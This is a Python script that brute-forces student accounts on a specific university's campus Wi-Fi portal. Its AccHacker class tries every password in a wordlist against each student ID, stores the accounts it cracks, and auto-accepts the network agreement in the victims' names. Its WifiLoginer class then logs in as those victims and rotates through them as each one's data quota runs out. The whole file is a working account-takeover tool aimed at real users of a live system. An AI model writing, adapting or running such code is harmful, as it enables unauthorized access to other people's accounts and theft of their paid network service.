# @Author  : GentleCP
# @Email   : 574881148@qq.com
# @File    : wifi.py
# @Item    : PyCharm
# @Time    : 2019/11/28/028 17:06
# @WebSite : https://www.gentlecp.com
import logging
import json
import time
import datetime
import requests
from urllib.parse import urlparse

from handler.exception import WifiError

def login_wifi(stuid,password):
    try:
        query_string = urlparse(requests.get("http://210.77.16.21").url).query
        payload = {
            "userId": stuid,
            "password": password,
            "service": "",
            "queryString": query_string,
            "operatorPwd": '',
            "operatorUserId": '',
            "validcode": '',
        }
        res = requests.post("http://210.77.16.21/eportal/InterFace.do?method=login", data=payload)
        res.encoding = 'u8'
    except (requests.exceptions.ConnectionError,
            requests.exceptions.ConnectTimeout,
            requests.exceptions.ReadTimeout):
        return None
    else:
        return {
            'result':res.json().get("result"),
            'msg':res.json().get("message"),
            'query_string':query_string
        }


class AccHacker(object):
    def __init__(self, data_path='data/data.txt',
                 password_path = 'data/password.txt',
                 accounts_path='accounts.json'):

        self._logger = logging.getLogger("AccHacker")
        self.d_accounts = None
        self.l_stuids = []
        self.l_passwords = []
        self._data_path = data_path
        self._accounts_path = accounts_path
        self._password_path = password_path

    def _set_info(self):
        """
        获取账户文件信息
        :return: user_info
        """
        with open(self._accounts_path, 'r') as f:
            self.d_accounts = json.loads(f.read())

        with open(self._data_path, 'r') as f:
            for line in f:
                self.l_stuids.append(line.strip())

        with open(self._password_path, 'r') as f:
            for line in f:
                self.l_passwords.append(line.strip())


    def _save_accounts(self, accounts, datas):
        with open(self._accounts_path, 'w') as f:
            f.write(json.dumps(accounts))

        with open(self._data_path, 'w') as f:
            for data in datas:
                f.write(data + '\n')

    def __confirm_protocol(self, stuid, query_string):
        headers = {
            'Connection': 'keep-alive',
            'Origin': 'http://210.77.16.21',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'Referer': 'http://210.77.16.21/eportal/index.jsp?' + query_string,
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
        }
        res = requests.post("http://210.77.16.21/eportal/InterFace.do?method=registerNetWorkProtocol",
                            data={'userId': stuid},
                            headers=headers)

        if res.json()["result"] == "ok":
            # 成功确认
            return True

    def _acc_hack(self):
        cur = 1
        range_num = len(self.l_passwords)
        for stuid in self.l_stuids:
            start = time.time()
            hacked = False
            for i,password in enumerate(self.l_passwords):
                login_res = login_wifi(stuid, password)
                print("\r","正在测试账号{},密码:{},预期进度：{:.2f}%,耗费时间:{:.2f}秒:".format(stuid,
                                                                         password,
                                                                         (i / range_num) * 100,
                                                                         time.time() - start), end='', flush=True)
                if login_res.get('result') == 'success':
                    self.d_accounts["useful_accounts"].append({"stuid": stuid, "pwd": password})
                    self._logger.info("破解新账户:{}，正存储到本地".format(stuid))
                    requests.get("http://210.77.16.21/eportal/InterFace.do?method=logout")  # 退出当前登录
                    print("破解账号{}耗时:{:.2f}s".format(stuid, time.time() - start))
                    hacked = True
                    break
                elif login_res.get('msg') == "密码不匹配,请输入正确的密码!":
                    pass
                elif login_res.get('msg') == "用户未确认网络协议书":
                    self.__confirm_protocol(stuid,login_res.get('query_string'))
                elif login_res.get('msg') == "认证设备响应超时,请稍后再试!":
                    time.sleep(1)
                else:
                    print("出现异常:{}".format(login_res.get('msg')))
                    break
            if not hacked:
                self._logger.info("未能破解账户:{}".format(stuid))
                print("未能破解账号{}耗时:{}s".format(stuid, time.time() - start))
            datas = self.l_stuids[cur:]
            cur += 1
            self._save_accounts(self.d_accounts, datas)

    def run(self):
        self._set_info()
        self._acc_hack()


class WifiLoginer(object):

    def __init__(self, accounts_path):
        self._logger = logging.getLogger("WifiLoginer")
        self.accounts_path = accounts_path  # 账户信息文件路径
        self.d_accounts = None


    def _set_account_info(self):
        """
        获取可用账户进行登录
        :return: user_info
        """
        try:
            with open(self.accounts_path, 'r') as f:
                try:
                    self.d_accounts = json.loads(f.read())
                except json.decoder.JSONDecodeError:
                    self._logger.error("不是json文件，请按照要求修改内容！")
                    exit(401)
                else:
                    if not self.d_accounts["useful_accounts"]:
                        # 所有账户流量都用完了
                        self._logger.info("没有可用账户!,请执行python ucashelper.py hack获取可用账号")
                        exit(401)

        except FileNotFoundError:
            self._logger.error("accounts.json文件不存在，请确认在根目录下创建！")
            exit(404)

    def _check_date(self):
        '''
        检查当前日期，如果是新的一个月，则重置所有账号可用
        :return:
        '''
        current_month = datetime.datetime.now().month
        with open(self.accounts_path, 'r') as f:
            res = json.loads(f.read())
        if res["current_month"] != current_month:
            res["useful_accounts"].extend(res["useless_accounts"])  # 将所有流量耗尽的账户添加到可用账户中
            res["useless_accounts"] = []
            res["current_month"] = current_month
            with open(self.accounts_path, 'w') as f:
                f.write(json.dumps(res))

    def _save_accounts(self,accounts):
        with open(self.accounts_path, 'w') as f:
            f.write(json.dumps(accounts))

    def _change_account(self, msg):
        self._logger.info("正在为您尝试切换可用账户...")
        if msg == '无可用剩余流量!' or "密码不匹配,请输入正确的密码!" :
            useless_account = self.d_accounts["useful_accounts"].pop(0)
            self.d_accounts["useless_accounts"].append(useless_account)
        elif msg == "设备未注册,请在ePortal上添加认证设备":
            self._logger.error("设备未注册，请断开wifi后重连再试！")
            exit(500)
        else:
            self.d_accounts["useful_accounts"].pop(0)

    def _check_login(self):
        url = "http://210.77.16.21/eportal/InterFace.do?method=getOnlineUserInfo"
        try:
            res = requests.get(url, timeout=2)
            if res.json()["result"] == 'success':
                # 已经登录
                self._logger.info("您已经登录校园网，无需重复登录！")
                return True
            else:
                self._logger.info("正在为您登录校园网...")
                return False
        except requests.exceptions.ConnectTimeout:
            # 超时说明无法提供ip
            self._logger.error("网络连接超时，请稍后再试！")
            exit(400)

        except requests.exceptions.ReadTimeout:
            self._check_login()

    def _login_wifi(self):
        try:
            stuid = self.d_accounts["useful_accounts"][0]["stuid"]
            password = self.d_accounts["useful_accounts"][0]["pwd"]
        except IndexError:
            self._logger.error("无可用账号！")
            self._save_accounts(self.d_accounts)
            raise WifiError

        login_res = login_wifi(stuid, password)
        if not login_res:
            self._logger.error("网络连接出错，可能原因：1、未连接上校园网 2、当前网络环境无可分配动态ip")
            raise WifiError

        if login_res.get('result')== 'success':
            self._logger.info("Wifi登录成功，尽情冲浪吧~")
            self._save_accounts(self.d_accounts)
        else:
            self._logger.info("{} 登录失败!原因：{}".format(stuid,login_res.get('msg')))
            self._change_account(login_res.get('msg'))
            self._login_wifi()

    def _get_flow_info(self):
        url = "http://210.77.16.21/eportal/InterFace.do?method=getOnlineUserInfo"
        try:
            res = requests.get(url)
        except (requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout):
            self._logger.error("网络连接出现问题，请检查是否已连接上校园网！")
            exit(400)
        else:
            res.encoding = 'u8'
            if res.json().get("message") == "用户信息不完整，请稍后重试":
                return self._get_flow_info()
            else:
                return res.json().get('maxFlow')


    def login(self):
        self._set_account_info()
        if not self._check_login():
            self._login_wifi()
            self._logger.info("剩余流量：{}".format(self._get_flow_info()))

    def logout(self):
        try:
            flow_info = self._get_flow_info()
            if flow_info :
                self._logger.info("剩余流量：{}".format(flow_info))
                requests.get("http://210.77.16.21/eportal/InterFace.do?method=logout")
                self._logger.info("已退出校园网！")
            else:
                self._logger.info("您尚未登录校园网！")

        except (requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout):
            self._logger.error("网络连接出现问题，请检查是否已连接上校园网！")
            raise WifiError

